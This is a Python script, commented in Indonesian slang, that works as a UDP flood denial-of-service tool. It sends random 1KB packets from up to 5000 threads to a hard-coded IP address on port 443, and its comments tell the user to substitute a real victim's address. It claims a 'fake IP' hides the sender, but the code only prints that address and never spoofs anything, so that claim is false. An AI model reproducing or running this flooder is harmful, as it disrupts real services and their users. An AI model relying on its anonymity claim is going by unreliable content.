import socket
import random
import threading
import time

# Target IP dan Port
target_ip = "172.67.186.161" # GANTI SAMA IP KORBAN ASLI LU!
target_port = 443 # GANTI SAMA PORT KORBAN ASLI LU!
fake_ip = '182.21.20.5' # IP PALSU BIAR LO GAK KETAHUAN

# Payload: Sampah data biar paketnya gede
payload = random._urandom(1024) # 1KB data acak tiap paket

# Jumlah koneksi/serangan yang mau lo jalankan
connection_count = 0
MAX_CONNECTIONS = 5000 # JUMLAH THREADS GANAS

def attack():
    global connection_count
    while connection_count < MAX_CONNECTIONS:
        try:
            # Bikin koneksi UDP mentah
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            # Kirim paket UDP dengan payload besar
            s.sendto(payload, (target_ip, target_port))
            
            # Tambahin hitungan serangan biar keliatan ganas
            connection_count += 1
            print(f"[{connection_count}] Paket ganas terkirim ke {target_ip}:{target_port} dari IP {fake_ip} 😈")

        except:
            # Kalo gagal, ya udah lanjut aja, gak usah cengeng
            pass
        
        finally:
            # Tutup koneksi, tapi UDP emang stateless, jadi ini cuma formalitas
            s.close()

# Loop buat bikin thread sebanyak yang lo mau
for i in range(MAX_CONNECTIONS):
    # Pake threading biar serangan serentak dan lebih brutal
    thread = threading.Thread(target=attack)
    thread.start()
    # Kasih jeda sedikit biar gak langsung crash
    time.sleep(0.001)

print("\n!!! TOOLS GANAS AKTIF SEMPURNA. KERUSUHAN DIMULAI !!!")
